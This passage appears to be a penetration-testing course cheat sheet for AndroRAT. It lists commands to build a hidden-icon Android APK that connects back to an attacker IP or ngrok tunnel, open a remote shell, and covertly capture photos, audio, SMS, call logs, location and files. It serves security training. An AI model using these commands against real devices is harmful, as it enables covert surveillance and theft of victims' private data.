@@ -1,0 +1,79 @@
+Certified Penetration Testing Professional Exam 412-80
+AndroRAT Cheat Sheet
+Certified Penetration Testing Professional
+AndroRAT Cheat Sheet
+AndroRAT
+Source: https://github.com
+AndroRAT is a tool designed to give control of the Android system remotely and retrieve
+information from it. AndroRAT is a client/server application developed in Java Android for the
+client side and the Server is in Python.
+Build Mode Syntax
+python3 androRAT.py --build [flags]
+Flags
+-i, --ip Attacker IP address (required)
+-p, --port Attacker port number (required)
+-o, --output Name for the apk file (optional)
+-icon, --icon Visible icon after installing apk (default hidden)
+Build Mode with ngrok Syntax
+python3 androRAT.py --build --ngrok [flags]
+Flags
+-p, --port Attacker port number (optional, default 8000)
+-o, --output Name for the apk file (optional, default "karma.apk")
+-icon, --icon Visible icon after installing apk (default hidden)
+Shell Mode Syntax
+python3 androRAT.py --shell [flags]
+Page | 1 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+AndroRAT Cheat Sheet
+Flags
+-i, --ip Listener IP address
+-p, --port Listener port number
+Obtains a remote shell on the compromised Android
+--shell
+device.
+Commands to be Run on Interpreter
+Command Description
+deviceInfo Returns basic info of the device
+camList Returns camera ID
+takepic [cameraID] Takes picture from camera
+startVideo [cameraID] Starts recording the video
+Stops recording the video and returns the video
+stopVideo
+file
+startAudio Starts recording the audio
+stopAudio Stops recording the audio
+getSMS [inbox|sent] Returns inbox or sent SMS in a file
+getCallLogs Returns call logs in a file
+shell Starts a sh shell of the device
+vibrate [number_of_times] Vibrates the device number of times
+getLocation Returns the current location of the device
+getIP Returns the IP of the device
+getSimDetails Returns details of all SIMs in the device
+clear Clears the screen
+getClipData Returns the current saved text from the clipboard
+getMACAddress Returns the MAC address of the device
+exit Exits the interpreter
+Page | 2 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+AndroRAT Cheat Sheet
+Sub Commands
+Command Description
+Downloads the file to the local machine (file size
+get [full_file_path]
+up to 15MB)
+put [filename] Uploads the file to the android device
+Other Example Commands
+Command Description
+python3 androRAT.py --build --
+Build APK with ngrok
+ngrok -o evil.apk
+python3 androRAT.py --build -i
+Build APK with IP and port
+192.169.x.x -p 8000 -o evil.apk
+python3 androRAT.py --shell -i
+Get Interpreter
+0.0.0.0 -p 8000
+Page | 3 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
